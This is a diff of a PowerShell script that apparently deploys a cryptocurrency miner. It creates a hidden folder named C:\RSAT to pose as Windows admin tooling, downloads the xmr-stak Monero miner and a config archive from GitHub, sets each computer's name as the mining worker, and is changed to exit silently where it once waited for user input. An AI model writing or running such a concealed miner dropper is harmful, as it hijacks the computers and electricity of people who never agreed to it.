@@ -7,9 +7,9 @@ $opsDirectory = "C:\RSAT"
 if (!(Test-Path $opsDirectory))
 {
 
-  mkdir $opsDirectory
-  $f = Get-Item $opsDirectory -Force
-  $f.Attributes = "Hidden"
+	mkdir $opsDirectory
+	$f = Get-Item $opsDirectory -Force
+	$f.Attributes = "Hidden"
 }
 
 
@@ -21,12 +21,12 @@ if (!(Test-Path $payload))
 
 {
 
-  $url = "https://github.com/fireice-uk/xmr-stak/releases/download/2.4.2/xmr-stak-win64.zip"
-  $start_time = Get-Date
+	$url = "https://github.com/fireice-uk/xmr-stak/releases/download/2.4.2/xmr-stak-win64.zip"
+	$start_time = Get-Date
 
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri $url -OutFile $payload
-  Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
+	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+	Invoke-WebRequest -Uri $url -OutFile $payload
+	Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 }
 
@@ -39,12 +39,13 @@ if (!(Test-Path $config))
 
 {
 
-  $url = "https://github.com/velvet-valdes/dump/releases/download/v0.1-alpha/dump.zip"
-  $start_time = Get-Date
+	#$url = "https://gist.github.com/velvet-valdes/7a0a29bff717de3209e85abfa203ddd1/archive/10e4f069e995485beb80ed0854dc6a5c931ab44b.zip"
+	$url = "https://github.com/velvet-valdes/dump/releases/download/v0.1-alpha/dump.zip"
+	$start_time = Get-Date
 
-  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-  Invoke-WebRequest -Uri $url -OutFile $config
-  Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
+	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+	Invoke-WebRequest -Uri $url -OutFile $config
+	Write-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"
 
 }
 
@@ -71,7 +72,4 @@ rm $config
 
 (Get-Content "$stakDir\pools.txt") | ForEach-Object { $_ -replace "REDLEG","$env:COMPUTERNAME" } | Set-Content "$stakDir\pools.txt"
 
-
-# Quick hack for user input to keep window open
-
-Read-Host -Prompt "Press Enter to exit"
+exit
